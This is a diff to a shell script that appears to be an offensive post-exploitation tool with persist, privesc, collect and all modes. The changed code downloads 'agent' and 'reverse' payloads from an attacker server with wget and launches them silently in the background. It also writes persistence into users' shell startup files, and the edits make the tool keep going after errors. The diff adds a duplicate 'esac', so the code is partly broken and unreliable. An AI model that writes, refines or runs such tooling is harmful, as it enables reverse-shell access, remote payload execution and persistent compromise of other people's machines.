@@ -130,18 +130,17 @@ persist_mode() {
 
     wget -q "http://$SERVER_IP/payloads/agent" -O agent || {
         echo "[-] Failed to download agent"
-        exit 1
+        return 1
     }
     wget -q "http://$SERVER_IP/payloads/reverse" -O reverse || {
         echo "[-] Failed to download reverse"
-        exit 1
+        return 1
     }
     chmod +x agent reverse
 
-    ./reverse &
-    disown || echo "[-] Reverse failed"
-    ./agent &
-    disown || echo "[-] Agent failed"
+    # Use subshell to prevent exit on failure and properly background+disown
+    (./reverse >/dev/null 2>&1 & disown) || echo "[-] Reverse failed"
+    (./agent >/dev/null 2>&1 & disown) || echo "[-] Agent failed"
 
     echo "[*] Adding persistence to shell configs..."
     for rc in "$BASEDIR/.bashrc" "$BASEDIR/.zshrc"; do
@@ -228,13 +227,14 @@ persist) persist_mode ;;
 privesc) privesc_mode ;;
 collect) collect_mode ;;
 all)
-    persist_mode
-    collect_mode
-    privesc_mode
+    persist_mode || echo "[-] Persist mode had errors, continuing..."
+    collect_mode || echo "[-] Collect mode had errors, continuing..."
+    privesc_mode || echo "[-] Privesc mode had errors, continuing..."
     ;;
 *)
     echo "Invalid mode: $MODE"
     echo "Valid modes: persist | privesc | collect | all"
     exit 1
     ;;
+esac
 esac
